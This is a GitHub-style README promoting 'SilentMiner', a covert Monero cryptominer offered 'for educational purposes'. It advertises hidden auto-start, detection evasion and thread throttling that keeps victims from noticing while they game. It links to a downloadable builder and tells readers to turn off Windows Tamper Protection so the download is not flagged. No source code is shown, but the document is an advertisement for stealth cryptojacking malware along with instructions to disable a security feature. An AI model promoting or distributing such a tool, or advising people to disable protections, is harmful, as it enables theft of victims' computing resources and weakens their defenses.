# SilentMiner
silent miner for educational purposes ( XMR ).
this is not meant to be used in illeagal ways. im not responsible for any bad actions that this program cause.

its really hard to detect the miner so if you want to test it, use virtual machine.
it auto start fully hidden, no cmd pop ups, also uses smart threads control: when user gaming or doing heavy work, it reduce the threads until the user exits the game or the heavy work.

download here: https://github.com/iiPolo/SilentMiner/releases/tag/v1

if theat appears when downloading go to Windows Search > Tamper Protection > Turn Everything Off.
its because the builder downloads Python packages if you dont have them, so windows detect it as suspicious.
feel free to use the builder in virtual machine to test out the miner too.
